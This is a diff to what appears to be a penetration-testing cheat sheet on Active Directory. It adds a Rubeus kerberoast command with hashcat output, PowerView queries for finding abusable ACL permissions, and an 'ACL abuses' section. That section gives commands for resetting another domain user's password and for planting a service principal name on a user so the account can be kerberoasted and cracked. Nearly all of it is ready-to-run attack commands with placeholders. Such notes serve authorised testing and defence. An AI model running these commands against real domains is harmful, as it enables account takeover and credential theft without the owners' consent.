@@ -46,6 +46,7 @@ Get-DomainUser -SPN | select samaccountname,serviceprincipalname
 
 ```
 Rubeus.exe kerberoast /stats
+Rubeus.exe kerberoast /format:hashcat
 ```
 
 #### Reguest a TGS
@@ -220,8 +221,11 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 - `ObjectDN` = The object the permissions apply to
 - `ActiveDirectoryRight` == Permissions
 - `IdentityReferenceName` == Object who has the permissions
+
+### Scan for ACL permissions
 ```
 Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN>
+Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectDN, ActiveDirectoryRights, Identityreference
 ```
 - Check every owned user in bloodhoud
 
@@ -231,6 +235,26 @@ Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN>
 Import-Module ACLight2.psm1
 Start-ACLAnalysis
 ```
+
+### ACL abuses
+#### Reset password of a user
+```
+net user <USERNAME> <PASSWORD> /domain
+
+$UserPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
+Set-DomainUserPassword -Identity <USERNAME> -AccountPassword $UserPassword
+```
+
+#### Set SPN for user
+- For example service ```HTTP/jumpbox```
+- Then kerberoast the user try to crack the password
+```
+setspn.exe -a <SERVICE>/<SPN> <DOMAIN>\<USERNAME>
+
+Set-DomainObject -Identity <USERNAME> -Set @{serviceprincipalname='<SERVICE>/<SPN>1'}
+```
+
+
 
 #### NTLMRelay
 - It is possible to abuse ACL with NTLMRelay abuse
